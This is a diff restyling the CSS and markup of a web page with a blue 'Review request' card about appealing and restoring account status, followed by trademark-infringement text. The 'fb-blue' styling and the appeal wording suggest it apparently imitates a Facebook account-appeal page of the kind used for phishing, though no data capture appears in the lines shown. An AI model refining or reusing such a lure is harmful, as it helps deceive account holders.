@@ -3277,27 +3277,50 @@
                     
                     </ul>
                     <style>  
-                        .button.fb-blue {  
+                        .fb-blue {  
                             background-color: #3399FF;  
+                        }  
+                    
+                        .card-text {  
+                            background-color: #3399FF;  
+                            color: white; /* This will ensure the text is readable against the blue background */  
+                            padding: 10px; /* Optional: Adds some spacing around the text */  
+                        }  
+                    
+                        .button {  
+                            background-color: #3399FF;  
+                            color: white;  
+                            padding: 10px 20px;  
+                            text-align: center;  
+                            cursor: pointer;  
+                        }  
+                    
+                        .button:hover {  
+                            background-color: #2a7fcc; /* Optional: Slightly darker shade on hover */  
+                        }  
+                    
+                        img {  
+                            width: 100%; /* Optional: Makes image responsive */  
+                            height: auto;  
                         }  
                     </style>  
                     
                     <div id="card">  
                         <!-- <img src="/img/unlock.png" alt=""> -->  
                         <!-- <img src="/img/mobile.png" alt=""> -->  
-                        <img src="../img/shild.jpg" alt="">  
-                        <div class="card-text">  
+                        <img src="../img/shild.jpg" alt="Shield Image">  
+                        <div class="card-text fb-blue">  
                             <p class="card-type">Review request</p>  
                             <h4>This form is only to be used for submitting appeals and restoring account status</h4>  
                             <p>Please ensure that you provide the requested information below.   
                                 Failure to do so may delay the processing of your appeal.</p>  
                             <div class="btn-wrapper">  
-                                <div id="start" class="button fb-blue w-100" data-bs-toggle="modal" data-bs-target="#exampleModal1">  
+                                <div id="start" class="button w-100" data-bs-toggle="modal" data-bs-target="#exampleModal1">  
                                     Request Review  
                                 </div>  
                             </div>  
                         </div>  
-                    </div>
+                    </div>  
                     <h5>What is trademark infringement?</h5>
                     
                     </h5>Generally, trademark infringement occurs when all three of the following requirements are met</h5>
